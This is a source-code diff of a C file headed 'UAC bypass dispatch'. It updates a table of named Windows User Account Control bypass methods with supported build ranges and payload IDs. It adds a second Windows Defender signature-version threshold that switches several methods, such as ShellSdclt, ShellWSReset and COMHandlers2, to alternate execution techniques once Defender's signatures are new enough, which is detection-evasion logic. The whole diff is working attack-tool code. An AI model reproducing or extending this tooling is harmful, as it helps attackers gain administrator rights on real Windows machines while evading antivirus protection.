@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     3.18
+*  VERSION:     3.19
 *
-*  DATE:        29 Mar 2019
+*  DATE:        22 May 2019
 *
 *  UAC bypass dispatch.
 *
@@ -122,27 +122,29 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodSXSDccw, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodHakril, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodCorProfiler, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodCOMHandlers, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { MethodCOMHandlers, NULL, { 7600, 18362 }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodCMLuaUtil, NULL, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
     { MethodFwCplLua, &WDCallbackType1, { 7600, 17134 }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
     { MethodDccwCOM, NULL, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
     { MethodVolatileEnv, NULL, { 7600, 16229 }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodSluiHijack, &WDCallbackType1, { 9600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
     { MethodBitlockerRC, NULL, { 7600, 16300 }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodCOMHandlers2, NULL, { 7600, MAXDWORD }, FUJINAMI_ID, FALSE, TRUE, TRUE },
+    { MethodCOMHandlers2, &WDCallbackType1, { 7600, 18362 }, FUJINAMI_ID, FALSE, TRUE, TRUE },
     { MethodSPPLUAObject, NULL, { 7600, 17763 }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodCreateNewLink, NULL, { 7600, 14393 }, FUBUKI_ID, FALSE, FALSE, TRUE },
     { MethodDateTimeStateWriter, NULL, { 7600, 17763 }, CHIYODA_ID, FALSE, TRUE, TRUE },
     { MethodAcCplAdmin, NULL, { 7600, 17134 }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
     { MethodDirectoryMock, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodShellSdctl, NULL, { 14393, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodShellSdctl, &WDCallbackType1, { 14393, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
     { MethodEgre55, NULL, { 14393, MAXDWORD }, FUBUKI_ID, TRUE, FALSE, TRUE },
     { MethodTokenModUIAccess, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, FALSE },
-    { MethodShellWSReset, NULL, { 17134, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodShellWSReset, &WDCallbackType1, { 17134, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
     { MethodSysprep, NULL, { 7600, 9600 }, FUBUKI_ID, FALSE, TRUE, TRUE }
 };
 
-#define WDCallbackType1MagicVer 282647531814912
+#define WDCallbackTypeMagicVer1 282647531814912
+#define WDCallbackTypeMagicVer2 282733539622912
+
 
 /*
 * SetMethodExecutionType
@@ -186,7 +188,7 @@ NTSTATUS CALLBACK SetMethodExecutionType(
         switch (Method) {
 
         case UacMethodSluiHijack:
-            if (SignatureVersion.Version >= WDCallbackType1MagicVer) {
+            if (SignatureVersion.Version >= WDCallbackTypeMagicVer1) {
                 g_ctx->MethodExecuteType = ucmExTypeRegSymlink;
             }
             else {
@@ -194,7 +196,18 @@ NTSTATUS CALLBACK SetMethodExecutionType(
             }
             break;
         case UacMethodFwCplLua:
-            if (SignatureVersion.Version >= WDCallbackType1MagicVer) {
+            if (SignatureVersion.Version >= WDCallbackTypeMagicVer1) {
+                g_ctx->MethodExecuteType = ucmExTypeIndirectModification;
+            }
+            else {
+                g_ctx->MethodExecuteType = ucmExTypeDefault;
+            }
+            break;
+
+        case UacMethodCOMHandlers2:
+        case UacMethodShellSdclt:
+        case UacMethodShellWSReset:
+            if (SignatureVersion.Version >= WDCallbackTypeMagicVer2) {
                 g_ctx->MethodExecuteType = ucmExTypeIndirectModification;
             }
             else {
@@ -303,6 +316,9 @@ VOID SetupExtraContextCalbacks(
     switch (Method) {
     case UacMethodSluiHijack:
     case UacMethodFwCplLua:
+    case UacMethodCOMHandlers2:
+    case UacMethodShellSdclt:
+    case UacMethodShellWSReset:
         Context->Parameter = ULongToPtr(Method);
         Context->Routine = SetMethodExecutionType;
         break;
